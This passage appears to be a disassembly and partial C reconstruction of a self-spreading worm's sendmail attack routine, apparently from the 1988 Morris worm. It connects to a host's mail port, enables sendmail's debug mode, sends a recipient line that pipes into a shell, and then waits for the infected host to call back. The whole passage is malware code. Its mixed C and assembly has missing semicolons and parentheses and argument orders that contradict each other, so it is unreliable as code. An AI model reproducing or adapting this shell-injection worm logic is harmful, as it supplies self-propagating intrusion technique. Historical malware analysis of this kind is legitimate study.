LL24:
	calls	$0x5,_makemagic	#  global routine _makemagic#
	if (!makemagic(a4, &f22c, &f230, &f234, &f238))
		return 0;
LL0:
	f228 = signal(SIGALARM, &justreturn);	/* movl	r0,-0x228(fp) */
	for (f4 = 0; f4 <= 6; f4++) {
		if (!a4->o30[f4])
			continue;
		if ((f14 = socket(3, 1,0)) < 0)
			continue;
		bzero(&f24, 16);
		f24.o0 = 2;
		f20 = a4->o30[f4];
		f22 = htons(25);
		alarm(10);
		if (connect(f14, &f24, 16) < 0) {
			alarm(0);
			close(f14);
			continue;
		}
		alarm(0);
		break;
	}
LL2:
	if (f4 > 6)
		return 0;
	if (!resp24(&f224, f14)
		goto LL10
	if (f224 != 50)
		goto LL10
	s_21be(f14, XS("debug"));
LL11:
	if (!resp24(f14, &f224))
		goto LL10
	if (f224 != 50)
		goto LL10
	s_21be(f14, XS("rcpt to:<" |sh ... ">");
	if (!resp24(f14, &f224))
		goto LL10
	if (f224 != 50)
		goto LL10
LL15:
	calls	$0x0,_random	#  global routine _random#
	bicl2	$0xFF000000,r0
	movl	r0,-0x4(fp)
	pushl	-0x4(fp)
	pushl	-0x4(fp)
	pushl	$mcount+0x29E	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	subl3	$0x224,fp,r0
	pushl	r0
	calls	$0x4,_sprintf	#  global routine _sprintf#
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL16
	cmpb	-0x224(fp),$0x32
	beql	LL17
LL16:
	brw	LL10
LL17:
	pushl	$mcount+0x2CE	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL18
	cmpb	-0x224(fp),$0x33
	beql	LL19
LL18:
	brw	LL10
LL19:
	pushl	$mcount+0x2D4	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	pushl	-0x238(fp)
	pushl	-0x234(fp)
	pushl	-0x230(fp)
	pushl	-0x22C(fp)
	pushl	-0x14(fp)
	pushl	0x4(ap)
	calls	$0x6,0x2014
	pushl	$mcount+0x2D6	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL20
	cmpb	-0x224(fp),$0x32
	beql	LL21
LL20:
	pushl	-0x238(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL10
LL21:
	pushl	$mcount+0x2DA	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	tstl	r0
	beql	LL22
	cmpb	-0x224(fp),$0x32
	beql	LL23
LL22:
	pushl	-0x238(fp)
	calls	$0x1,_close	#  global routine _close#
	brb	LL10
LL23:
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	pushl	-0x238(fp)
	pushl	-0x234(fp)
	pushl	-0x230(fp)
	pushl	-0x22C(fp)
	pushl	0x4(ap)
	calls	$0x5,_waithit	#  global routine _waithit#
	ret
LL10:
	pushl	$mcount+0x2E0	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,0x21BE
	subl3	$0x224,fp,r0
	pushl	r0
	pushl	-0x14(fp)
	calls	$0x2,_resp24	#  global routine _resp24#
	pushl	-0x14(fp)
	calls	$0x1,_close	#  global routine _close#
	clrf	r0
	ret
	ret
	movab	-0x238(sp),sp
	brw	LL24
####  END PROC ####
